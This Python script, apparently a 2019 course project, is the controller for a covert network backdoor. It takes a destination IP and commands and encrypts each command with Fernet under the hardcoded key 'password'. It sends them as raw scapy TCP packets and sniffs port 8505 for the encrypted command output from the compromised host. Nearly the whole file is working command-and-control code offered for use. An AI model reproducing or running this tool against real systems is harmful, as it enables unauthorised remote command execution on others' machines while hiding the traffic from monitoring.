#!/usr/bin/env python3

#----------------------------------------------------------------------------------------------------------------------
# 
# Source File: backdooraccess.py
# Program Usage: ./backdooraccess.py
#
# Date: October 17, 2019
# Designers: Matthew Baldock
# Programmers: Matthew Baldock 
#
# Notes: Runs a Backdoor Access Tool
# 
# 
#----------------------------------------------------------------------------------------------------------------------
import base64
import sys
from scapy.all import *
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def backdoor_packet_handler(pkt):
    global responded
    print("Packet Received")
    if TCP in pkt and pkt[TCP].dport==8505:
        try:
            print(decrypt(pkt.load, b"password"))
            responded = 1
            return True
        except:
            print("Can't decrypt the packet")
            return False

# ----------------------------------------------------------------------------------------------------------------------
# The encrypt function takes in a message and encrypts using the Fernet encryption algorithm from the cryptography
# package
#
# Params:
# hiddenMsg - the plaintext to be encrypted (in bytes)
# password - the password used to encrypt the message (in bytes)
#
# Returns:
# encrypt returns an array of bytes that represents the encrypted message
# ----------------------------------------------------------------------------------------------------------------------
def encrypt(hiddenMsg, password):
    salt = b'?%U;\x97\xd8%\x8c\x08\xae\xdeL\xae\xba\xa5M'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )

    key = base64.urlsafe_b64encode(kdf.derive(password))
    encrypter = Fernet(key)
    token = encrypter.encrypt(hiddenMsg)
    return token

# ----------------------------------------------------------------------------------------------------------------------
# The decrypt function takes in ciphertext and decrypts it using the Fernet encryption algorithm from the cryptography
# package
#
# Params:
# ciphertext - the ciphertext to be decrypted (in bytes)
# password - the password used to decrypt the message (in bytes)
#
# Returns:
# decrypt returns an array of bytes that represents the decrypted message
# ----------------------------------------------------------------------------------------------------------------------
def decrypt(cipherText, password):
    salt = b'?%U;\x97\xd8%\x8c\x08\xae\xdeL\xae\xba\xa5M'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )

    key = base64.urlsafe_b64encode(kdf.derive(password))
    encrypter = Fernet(key)
    return encrypter.decrypt(cipherText)



dAddr = input("Enter Destination IP\n")
srcPort = input("Enter Source Port\n")
while 1:
    responded = 0
    cmdLn = input("Enter command\n")
    ip = IP(dst=dAddr)
    ip.show()
    tcp = TCP(sport=int(srcPort))
    tcp.show()
    encryptCommand = encrypt(b"COMMAND_START" + cmdLn.encode() + b"COMMAND_END", b"password")
    pack = (ip / tcp / encryptCommand)
    send(pack)
    sniff(prn=backdoor_packet_handler, filter="tcp and dst port 8505", store=0,count=1)


exit()
